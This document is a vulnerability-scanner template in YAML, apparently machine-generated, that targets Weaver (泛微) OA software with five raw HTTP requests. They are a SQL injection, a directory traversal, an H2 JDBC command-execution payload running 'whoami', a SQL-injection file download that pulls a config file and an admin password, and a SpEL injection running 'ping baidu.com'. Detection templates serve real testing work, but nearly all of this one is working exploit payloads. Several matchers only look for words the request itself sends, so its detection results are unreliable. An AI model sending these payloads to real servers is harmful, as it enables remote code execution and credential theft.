id: weaver-Vulnerability

info:
  name: Example Vulnerability Detection
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Detects various vulnerabilities in 泛微 software, including SQL injection, directory traversal, remote code execution, and arbitrary file download.
    This template contains multiple requests to identify these issues.
  tags: weaver, sql-injection, rce, directory-traversal, file-download

flow: http(1) && http(2) && http(3) && http(4) && http(5)

http:
  - id: sql-injection
    raw:
      - |
        GET /general/new_mytable/block_content.php?block_id=1%20UNION%20ALL%20SELECT%20CONCAT(0x71787a6a71,IFNULL(CAST(md5(123456)%20AS%20NCHAR),0x20),0x7171627671)--%20- HTTP/1.1
        Host: {{BaseURL}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "e10adc3949ba59abbe56e057f20f883e"

  - id: directory-traversal
    raw:
      - |
        GET /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../ HTTP/1.1
        Host: {{BaseURL}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "WEB-INF"

  - id: jdbc-rce
    raw:
      - |
        POST /api/integration/datasource/update/ HTTP/1.1
        Host: {{BaseURL}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
        Accept-Encoding: gzip
        Connection: keep-alive
        Content-Length: 377
        Content-Type: application/x-www-form-urlencoded
        Cookie: __clusterSessionIDCookieName=adcf474c-8ca4-4002-b0d7-ce6e32486666;__clusterSessionCookieName=4D368CCF5613FEED9A080A2013810BDE;
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246

        pointid=aaa&type=sqlserver2025&iscluster=2&username=333&port=1&dbname=aaaa&password=11&usepool=1&minconn=5&maxconn=10&sortid=1&id=1&operate=test&host=abc&url=jdbc:h2:mem:test;MODE=MSSQLSERVER;INIT=CREATE ALIAS EXEC AS $$ String exec(String cmd) throws java.lang.Exception { return java.lang.Runtime.getRuntime().exec(cmd).getInputStream().toString(); } $$\;CALL EXEC('whoami');
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "whoami"

  - id: file-download
    raw:
      - |
        GET /weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&downfiletype=eml&download=1&mailId=1123+union+select+*+from+(select+1+as+resourceid,'../ecology/WEB-INF/prop/mobilemode.properties'+as+x2,'3'+as+x3,(select++*+from+(select+*+from+(select+password+from+HrmResourceManager+where+id=1)x)x)+as+x4,5+as+x5,6+as+x6)x+where+1=1&mailid=action.WorkflowFnaEffectNew&parentid=0 HTTP/1.1
        Host: {{BaseURL}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "mobilemode.properties"

  - id: rce-remark-operate
    raw:
      - |
        POST /api/workflow/reqform/remarkOperate HTTP/1.1
        Host: {{BaseURL}}
        Content-Type: application/json

        {
          "operate": "save",
          "field5": "5241,5240",
          "IsBeForwardSubmitAlready": "1",
          "IsBeForwardAlready": "0",
          "IsSubmitedOpinion": "1",
          "IsBeForwardTodo": "0",
          "forwardflag": "1",
          "requestid": "5288726",
          "nodeid": "11995",
          "f_weaver_belongto_userid": "5240",
          "f_weaver_belongto_usertype": "0",
          "signworkflowids": "",
          "signdocids": "",
          "remarkLocation": "",
          "remark": "${T(java.lang.Runtime).getRuntime().exec('ping baidu.com')}",
          "remindTypes": "0,2"
        }
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "baidu.com"
